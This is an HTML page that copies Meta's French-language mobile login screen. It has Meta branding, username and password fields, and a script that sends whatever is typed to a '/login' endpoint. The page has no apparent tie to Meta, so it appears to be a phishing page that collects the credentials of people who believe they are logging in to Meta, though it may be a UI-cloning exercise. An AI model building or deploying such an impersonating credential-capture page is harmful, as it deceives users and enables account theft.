<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta-name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-gray-800 flex flex-col min-h-screen">

    <div class="m-4 flex flex-col justify-center items-center">
        
        <p class="text-white">Français (France)</p>

        <img src="./image/svgviewer-output.svg" class="w-[60px] mt-[40px]" alt="">

        <div class="mt-12 flex flex-col gap-5 w-full max-w-[450px]">

            <input 
                id="username"
                name="username"
                type="text" 
                class="p-3 bg-gray-800 text-white border border-2 border-gray-400 rounded-[8px]"
                placeholder="Nom de profil, e-mail, ou numéro de mobile">

            <input 
                id="password"
                name="password"
                type="password" 
                class="p-3 bg-gray-800 text-white border border-2 border-gray-400 rounded-[8px]"
                placeholder="Mot de passe">

        </div>

        <div class="mt-5 flex justify-center items-center flex-col w-full max-w-[450px]">
            <button id="loginBtn" class="bg-blue-600 text-white p-2 rounded-2xl w-full text-xl">
                Se connecter
            </button>

            <button class="mt-5 text-white">
                Mot de passe oublié ?
            </button>
        </div>
    </div>

    <div class="mt-auto flex items-center flex-col text-white mb-4 w-full max-w-[450px] mx-auto">

        <button class="p-3 text-blue-400 border border-2 border-blue-400 rounded-[30px] w-full">
            Créer un compte
        </button>

        <div class="flex items-center gap-2 mt-4">
            <img src="./image/svgviewer-output (1).svg" class="w-[40px]" alt="">
            <h1>Meta</h1>
        </div>
    </div>

    <script>
        document.getElementById("loginBtn").addEventListener("click", async () => {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            await fetch("/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username, password })
            });
        });
    </script>

</body>
</html>
